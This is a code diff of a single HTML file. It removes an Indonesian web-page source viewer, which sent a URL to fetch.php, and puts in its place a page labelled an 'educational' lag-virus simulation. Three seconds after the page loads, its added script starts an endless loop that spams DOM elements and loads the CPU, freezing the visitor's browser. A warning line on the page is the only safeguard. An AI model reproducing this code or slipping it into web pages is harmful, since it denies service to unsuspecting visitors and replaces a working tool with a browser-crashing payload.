@@ -1,40 +1,29 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Penerjemah Link Web</title>
+  <title>Simulasi Lag HTML</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
-    input, button { padding: 10px; margin: 5px 0; width: 100%; }
-    textarea { width: 100%; height: 400px; white-space: pre-wrap; margin-top: 10px; }
+    body { background: black; color: lime; font-family: monospace; }
   </style>
 </head>
 <body>
-  <h2>Penerjemah Link Web (HTML Viewer)</h2>
-  <input type="text" id="urlInput" placeholder="Tempelkan link website di sini..." />
-  <button onclick="fetchHTML()">Periksa</button>
-  <textarea id="resultArea" readonly placeholder="Kode HTML akan muncul di sini..."></textarea>
+  <h1>🚨 SIMULASI: HTML Lag Virus</h1>
+  <p>Browser kamu akan mulai lag setelah 3 detik...</p>
 
   <script>
-    function fetchHTML() {
-      const url = document.getElementById('urlInput').value;
-      const resultArea = document.getElementById('resultArea');
-      resultArea.value = 'Memuat...';
+    setTimeout(() => {
+      while (true) {
+        // Spam elemen DOM
+        const spam = document.createElement('div');
+        spam.innerText = '⚠️ VIRUS EDUKASI - SPAM DOM - ' + Math.random();
+        document.body.appendChild(spam);
 
-      fetch('fetch.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'url=' + encodeURIComponent(url)
-      })
-      .then(response => response.text())
-      .then(data => {
-        resultArea.value = data;
-      })
-      .catch(err => {
-        resultArea.value = 'Gagal mengambil data: ' + err;
-      });
-    }
+        // Tambah load CPU
+        for (let i = 0; i < 1000000; i++) {
+          Math.sqrt(Math.random() * i);
+        }
+      }
+    }, 3000); // Delay agar kamu sempat tutup tab
   </script>
 </body>
 </html>
